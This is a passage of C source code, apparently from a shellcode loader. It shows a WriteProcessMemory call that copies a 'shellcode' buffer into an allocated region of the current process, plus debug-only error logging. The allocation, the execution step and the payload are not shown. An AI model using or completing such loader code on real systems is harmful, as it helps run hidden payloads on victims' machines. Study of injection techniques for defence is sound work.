                (HANDLE)-1,
                allocation,
                shellcode,
                size,
                &bytesWritten);

            if (!res) {
                #ifdef _DEBUG_
                wprintf(L"ERROR: WriteProcessMemory = 0x%x\n", GetLastError());
                #endif
                return NULL;
            }
        #endif

        #ifdef _DEBUG_
            wprintf(L"Written %d bytes of data @ 0x%x\n", bytesWritten, allocation);
        #endif

